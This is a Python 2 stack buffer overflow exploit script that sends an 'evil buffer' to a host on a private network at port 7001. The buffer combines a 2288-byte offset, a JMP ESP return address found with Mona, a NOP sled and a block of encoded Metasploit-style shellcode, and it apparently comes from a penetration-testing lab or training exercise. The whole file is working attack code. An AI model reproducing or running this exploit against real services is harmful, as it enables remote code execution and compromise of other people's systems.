#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."
   
    # No Bad Characters
    shellcode =  ""
    shellcode += "\xbe\x55\xb6\x9d\xa0\xda\xdd\xd9\x74\x24\xf4\x5f"
    shellcode += "\x2b\xc9\xb1\x52\x83\xef\xfc\x31\x77\x0e\x03\x22"
    shellcode += "\xb8\x7f\x55\x30\x2c\xfd\x96\xc8\xad\x62\x1e\x2d"
    shellcode += "\x9c\xa2\x44\x26\x8f\x12\x0e\x6a\x3c\xd8\x42\x9e"
    shellcode += "\xb7\xac\x4a\x91\x70\x1a\xad\x9c\x81\x37\x8d\xbf"
    shellcode += "\x01\x4a\xc2\x1f\x3b\x85\x17\x5e\x7c\xf8\xda\x32"
    shellcode += "\xd5\x76\x48\xa2\x52\xc2\x51\x49\x28\xc2\xd1\xae"
    shellcode += "\xf9\xe5\xf0\x61\x71\xbc\xd2\x80\x56\xb4\x5a\x9a"
    shellcode += "\xbb\xf1\x15\x11\x0f\x8d\xa7\xf3\x41\x6e\x0b\x3a"
    shellcode += "\x6e\x9d\x55\x7b\x49\x7e\x20\x75\xa9\x03\x33\x42"
    shellcode += "\xd3\xdf\xb6\x50\x73\xab\x61\xbc\x85\x78\xf7\x37"
    shellcode += "\x89\x35\x73\x1f\x8e\xc8\x50\x14\xaa\x41\x57\xfa"
    shellcode += "\x3a\x11\x7c\xde\x67\xc1\x1d\x47\xc2\xa4\x22\x97"
    shellcode += "\xad\x19\x87\xdc\x40\x4d\xba\xbf\x0c\xa2\xf7\x3f"
    shellcode += "\xcd\xac\x80\x4c\xff\x73\x3b\xda\xb3\xfc\xe5\x1d"
    shellcode += "\xb3\xd6\x52\xb1\x4a\xd9\xa2\x98\x88\x8d\xf2\xb2"
    shellcode += "\x39\xae\x98\x42\xc5\x7b\x0e\x12\x69\xd4\xef\xc2"
    shellcode += "\xc9\x84\x87\x08\xc6\xfb\xb8\x33\x0c\x94\x53\xce"
    shellcode += "\xc7\x5b\x0b\xa7\x85\x34\x4e\x47\xbb\x98\xc7\xa1"
    shellcode += "\xd1\x30\x8e\x7a\x4e\xa8\x8b\xf0\xef\x35\x06\x7d"
    shellcode += "\x2f\xbd\xa5\x82\xfe\x36\xc3\x90\x97\xb6\x9e\xca"
    shellcode += "\x3e\xc8\x34\x62\xdc\x5b\xd3\x72\xab\x47\x4c\x25"
    shellcode += "\xfc\xb6\x85\xa3\x10\xe0\x3f\xd1\xe8\x74\x07\x51"
    shellcode += "\x37\x45\x86\x58\xba\xf1\xac\x4a\x02\xf9\xe8\x3e"
    shellcode += "\xda\xac\xa6\xe8\x9c\x06\x09\x42\x77\xf4\xc3\x02"
    shellcode += "\x0e\x36\xd4\x54\x0f\x13\xa2\xb8\xbe\xca\xf3\xc7"
    shellcode += "\x0f\x9b\xf3\xb0\x6d\x3b\xfb\x6b\x36\x5b\x1e\xb9"
    shellcode += "\x43\xf4\x87\x28\xee\x99\x37\x87\x2d\xa4\xbb\x2d"
    shellcode += "\xce\x53\xa3\x44\xcb\x18\x63\xb5\xa1\x31\x06\xb9"
    shellcode += "\x16\x31\x03"

    # msfOffset/Padding(A-\x41) + EIP(\x42) + ESP(\x43)
    padding = "A"*2288 + "B"*12 + "C"*500

    msfOffset = "A"*2288
    # EIP is replaced with a Return Address, in this case JMP ESP that points to the ESP Register: 0x148010CF in Endian Format. Found with Mona.
    eip = "\xCF\x10\x80\x14"
    # offset is the space between EIP and ESP
    offset = "D" * 8
    # nops required for the encoder stub
    nops = "\x90"*10

    buffer = msfOffset + eip + offset + nops + shellcode
    
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.146.10", 7001))
    s.send(buffer)
    
    s.close()
    print "\nDone!"
  
except IOError as msg:
    print msg
    print "\nCould not connect!"
